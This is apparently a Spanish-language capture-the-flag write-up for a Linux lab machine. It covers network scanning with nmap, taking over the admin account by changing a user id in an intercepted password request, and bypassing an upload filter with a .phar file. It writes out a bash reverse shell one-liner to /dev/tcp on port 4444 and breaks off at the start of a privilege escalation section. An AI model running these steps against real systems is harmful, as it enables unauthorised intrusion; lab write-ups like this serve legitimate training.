### Tags:

# Reconocimiento (`Linux`)

Lo primero que hacemos es un **escaneo de equipos** que estén conectados ami red de esta forma:

```ruby
arp-scan -I eth0 --localnet
```

![image](https://github.com/user-attachments/assets/3badab58-7fec-4601-9fd1-3a6a4360f2b0)


# Escaneo (*22, 80*)

```css
sudo nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn <IP>
```

![image](https://github.com/user-attachments/assets/412d0f46-27e6-423e-bae0-74f04c5111d9)

```css
sudo nmap -p22,80 -sCV <IP> -oN escaneo
```

![image](https://github.com/user-attachments/assets/52c81a92-80ea-4ee3-99e5-87ba14bbca60)

# Port 80

La web esta y observamos que hay un panel de login

![image](https://github.com/user-attachments/assets/956c8e12-5891-4648-8732-290318958e8d)

Probamos Inyecciones SQL pero nada, pero vemos que podemos **registrarnos**

![image](https://github.com/user-attachments/assets/f3011e0a-b79a-4ed5-b26e-0cb2d641e1ce)

Nos registramos como `test:test123` y vemos que podemos ingresar

![image](https://github.com/user-attachments/assets/3dc7b59a-07b5-4b01-9777-8524bbe88c79)

### BurpSuite

Ahora lo que hacemos con BurpSuite es interceptar la petición de `Password` 

![image](https://github.com/user-attachments/assets/ddc7d70a-d7c6-4062-a478-b2777e1302ef)

Observamos que esta viajando por POST y que nos el id 

![image](https://github.com/user-attachments/assets/ea004b07-d265-403f-a116-83c040a2b24f)

- Por ende lo que podemos hacer es:
	- Asignarle el **id=1** que puede ser admin y de **password=admin**

![image](https://github.com/user-attachments/assets/9499afec-15d3-4ecc-a252-353005f83ffa)

- Ahora volvemos a la web, nos deslogueamos y ponemos `admin:admin`
	- Y estamos dentro 

![image](https://github.com/user-attachments/assets/f4a862f9-8533-4876-9aae-da642cf5988d)

# Explotación

Lo que hice fue tartar de subir una **archivo.php** malicioso pero nos dice que solo acepta `jpg,png,gif`, por ende vamos a atener que hacer un Bypass

![image](https://github.com/user-attachments/assets/f10e592f-279d-4dd1-9853-efc1efafb104)

Pero interceptándolo con Burp, lo que hicimos es llamar al archivo con extensión `.phar` y funciono

![image](https://github.com/user-attachments/assets/e4b1fc59-1983-4006-a95a-8aea5d3e4453)

Ahora llamo al archivo y vemos si 

![image](https://github.com/user-attachments/assets/9c72d8ea-dc94-4cc0-9849-38e9b1e7b721)

- Nos mandamos una ReverseShell con este comando: `bash -c "bash -i >%26 /dev/tcp/<IP>/4444 0>%261"`
	- Nos ponemos en escucha con `Netcat`

![image](https://github.com/user-attachments/assets/56737569-6128-47f4-a545-13b35ee0452b)

Ahora hacemos el tratamiento de la `TTY`

```ruby
script /dev/null - bash
Ctrl + z
stty raw -echo;fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 42 columns 189
```

# Escalada (``John``)

- Si vemos tenemos un binario `toto` que si lo ejecutamos nos da el **ID** de john
	- Por ende lo que vamos a hacer es un secuestro 



































